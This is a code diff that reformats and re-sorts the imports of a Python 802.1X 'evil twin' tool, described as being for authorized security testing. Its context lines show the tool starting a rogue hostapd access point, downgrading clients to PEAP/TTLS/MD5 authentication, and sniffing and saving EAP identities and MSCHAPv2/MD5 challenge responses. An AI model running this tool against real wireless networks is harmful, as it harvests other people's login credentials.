@@ -6,24 +6,23 @@ whether 802.1X supplicants properly validate server certificates.
 For authorized security testing and research only.
 """
 
-import sys
-import os
 import argparse
 import json
-import subprocess
+import os
 import signal
+import subprocess
+import sys
 import tempfile
 import threading
 import time
 from datetime import datetime
 from typing import Optional
 
-from scapy.layers.dot11 import Dot11, RadioTap
-from scapy.layers.eap import EAP, EAPOL
+from scapy.layers.dot11 import Dot11
+from scapy.layers.eap import EAP
 from scapy.sendrecv import sniff
 
-from utils import validate_interface, require_root, setup_logging
-
+from utils import require_root, setup_logging, validate_interface
 
 # EAP type constants
 EAP_TYPE_IDENTITY = 1
@@ -47,9 +46,15 @@ class EAPAttack:
     validate server certificates.
     """
 
-    def __init__(self, interface: str, ssid: str, channel: int = 6,
-                 output_dir: str = "captures", timeout: int = 300,
-                 eap_method: str = "peap") -> None:
+    def __init__(
+        self,
+        interface: str,
+        ssid: str,
+        channel: int = 6,
+        output_dir: str = "captures",
+        timeout: int = 300,
+        eap_method: str = "peap",
+    ) -> None:
         self.interface: str = interface
         self.ssid: str = ssid
         self.channel: int = channel
@@ -105,17 +110,17 @@ class EAPAttack:
         ]
 
         if self.eap_method == "peap":
-            lines.append('* PEAP,TTLS,MD5')
+            lines.append("* PEAP,TTLS,MD5")
             lines.append('"t" MSCHAPV2 "password" [2]')
         elif self.eap_method == "ttls":
-            lines.append('* TTLS,PEAP,MD5')
+            lines.append("* TTLS,PEAP,MD5")
             lines.append('"t" MSCHAPV2,MD5 "password" [2]')
         elif self.eap_method == "md5":
-            lines.append('* MD5')
+            lines.append("* MD5")
             lines.append('"t" MD5 "password" [2]')
         else:
             # Fallback to PEAP
-            lines.append('* PEAP,TTLS,MD5')
+            lines.append("* PEAP,TTLS,MD5")
             lines.append('"t" MSCHAPV2 "password" [2]')
 
         return "\n".join(lines) + "\n"
@@ -160,9 +165,7 @@ class EAPAttack:
 
             with self._lock:
                 self.captured_credentials.append(cred)
-            self.logger.info(
-                "EAP Identity Response: %s (MAC: %s)", identity, src_mac or "unknown"
-            )
+            self.logger.info("EAP Identity Response: %s (MAC: %s)", identity, src_mac or "unknown")
 
         # MSCHAP challenge/response (type 26 within EAP)
         elif eap_layer.code == EAP_CODE_RESPONSE and eap_layer.type == EAP_TYPE_MSCHAPV2:
@@ -176,9 +179,7 @@ class EAPAttack:
 
             with self._lock:
                 self.captured_credentials.append(cred)
-            self.logger.info(
-                "MSCHAPv2 Response captured (MAC: %s)", src_mac or "unknown"
-            )
+            self.logger.info("MSCHAPv2 Response captured (MAC: %s)", src_mac or "unknown")
 
         # MD5-Challenge response
         elif eap_layer.code == EAP_CODE_RESPONSE and eap_layer.type == EAP_TYPE_MD5:
@@ -192,9 +193,7 @@ class EAPAttack:
 
             with self._lock:
                 self.captured_credentials.append(cred)
-            self.logger.info(
-                "EAP-MD5 Challenge Response captured (MAC: %s)", src_mac or "unknown"
-            )
+            self.logger.info("EAP-MD5 Challenge Response captured (MAC: %s)", src_mac or "unknown")
 
     def _run_sniffer(self) -> None:
         """Run the packet sniffer in a background thread."""
@@ -236,9 +235,7 @@ class EAPAttack:
 
         # Generate and write EAP user file
         eap_user_content = self._generate_eap_user_file()
-        eap_user_file = tempfile.NamedTemporaryFile(
-            mode="w", suffix="_eap_users", delete=False
-        )
+        eap_user_file = tempfile.NamedTemporaryFile(mode="w", suffix="_eap_users", delete=False)
         eap_user_file.write(eap_user_content)
         eap_user_file.close()
         self._temp_files.append(eap_user_file.name)
@@ -252,9 +249,7 @@ class EAPAttack:
         hostapd_config = hostapd_config.replace("{server_cert}", "/etc/hostapd/server.pem")
         hostapd_config = hostapd_config.replace("{private_key}", "/etc/hostapd/server.key")
 
-        conf_file = tempfile.NamedTemporaryFile(
-            mode="w", suffix="_hostapd_eap.conf", delete=False
-        )
+        conf_file = tempfile.NamedTemporaryFile(mode="w", suffix="_hostapd_eap.conf", delete=False)
         conf_file.write(hostapd_config)
         conf_file.close()
         self._temp_files.append(conf_file.name)
@@ -263,15 +258,18 @@ class EAPAttack:
         try:
             subprocess.run(
                 ["ip", "addr", "flush", "dev", self.interface],
-                capture_output=True, timeout=5,
+                capture_output=True,
+                timeout=5,
             )
             subprocess.run(
                 ["ip", "addr", "add", "10.0.0.1/24", "dev", self.interface],
-                capture_output=True, timeout=5,
+                capture_output=True,
+                timeout=5,
             )
             subprocess.run(
                 ["ip", "link", "set", self.interface, "up"],
-                capture_output=True, timeout=5,
+                capture_output=True,
+                timeout=5,
             )
         except (subprocess.TimeoutExpired, FileNotFoundError) as e:
             self.logger.error("Failed to configure interface: %s", e)
@@ -282,7 +280,8 @@ class EAPAttack:
         try:
             self._hostapd_proc = subprocess.Popen(
                 ["hostapd", conf_file.name],
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
             )
             time.sleep(2)
             if self._hostapd_proc.poll() is not None:
@@ -362,9 +361,7 @@ class EAPAttack:
         try:
             os.makedirs(self.output_dir, exist_ok=True)
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            filepath = os.path.join(
-                self.output_dir, f"eap_creds_{timestamp}.json"
-            )
+            filepath = os.path.join(self.output_dir, f"eap_creds_{timestamp}.json")
             with open(filepath, "w", encoding="utf-8") as f:
                 json.dump(self.captured_credentials, f, indent=2)
             self.logger.info("Credentials saved to %s", filepath)
@@ -425,21 +422,26 @@ Note: Requires hostapd installed with EAP support.
         """,
     )
 
-    parser.add_argument("-i", "--interface", required=True,
-                        help="Wireless interface")
-    parser.add_argument("-s", "--ssid", required=True,
-                        help="SSID to broadcast")
-    parser.add_argument("-ch", "--channel", type=int, default=6,
-                        help="WiFi channel (default: 6)")
-    parser.add_argument("-m", "--method", default="peap",
-                        choices=list(SUPPORTED_EAP_METHODS),
-                        help="EAP method (default: peap)")
-    parser.add_argument("-o", "--output-dir", default="captures",
-                        help="Output directory for captured credentials (default: captures)")
-    parser.add_argument("-t", "--timeout", type=int, default=300,
-                        help="Timeout in seconds (default: 300)")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                        help="Verbose output")
+    parser.add_argument("-i", "--interface", required=True, help="Wireless interface")
+    parser.add_argument("-s", "--ssid", required=True, help="SSID to broadcast")
+    parser.add_argument("-ch", "--channel", type=int, default=6, help="WiFi channel (default: 6)")
+    parser.add_argument(
+        "-m",
+        "--method",
+        default="peap",
+        choices=list(SUPPORTED_EAP_METHODS),
+        help="EAP method (default: peap)",
+    )
+    parser.add_argument(
+        "-o",
+        "--output-dir",
+        default="captures",
+        help="Output directory for captured credentials (default: captures)",
+    )
+    parser.add_argument(
+        "-t", "--timeout", type=int, default=300, help="Timeout in seconds (default: 300)"
+    )
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
 
     args = parser.parse_args()
     require_root()
